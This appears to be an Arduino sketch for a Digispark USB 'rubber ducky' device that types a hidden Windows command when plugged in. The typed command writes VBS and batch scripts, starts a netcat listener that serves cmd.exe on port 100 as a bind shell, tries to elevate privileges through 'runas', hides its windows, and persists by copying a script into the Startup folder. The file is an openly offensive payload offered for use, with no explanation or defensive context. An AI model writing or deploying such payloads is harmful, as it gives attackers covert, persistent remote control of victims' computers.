#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.print("cd /p & echo set w=CreateObject(\"Shell.Application\") > as.vbs & echo w.ShellExecute \"s.bat\",,\"C:\\p\", \"runas\", 0 >> as.vbs & echo set w=CreateObject(\"WScript.Shell\") > hs.vbs & echo w.Run chr(34) ^& \"C:\\p\\s.bat\" ^& chr(34), 0 >> hs.vbs & echo set w=CreateObject(\"WScript.Shell\") > ht.vbs & echo w.Run chr(34) ^& \"C:\\p\\t.bat\" ^& chr(34), 0 >> ht.vbs & echo start C:\\p\\nc.exe -Lp 100 -vv -e cmd.exe -d > s.bat & echo cd /p ^& taskkill /im nc.exe /f ^& start as.vbs ^& timeout /t 15 ^& start hs.vbs > t.bat & copy ht.vbs /y %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
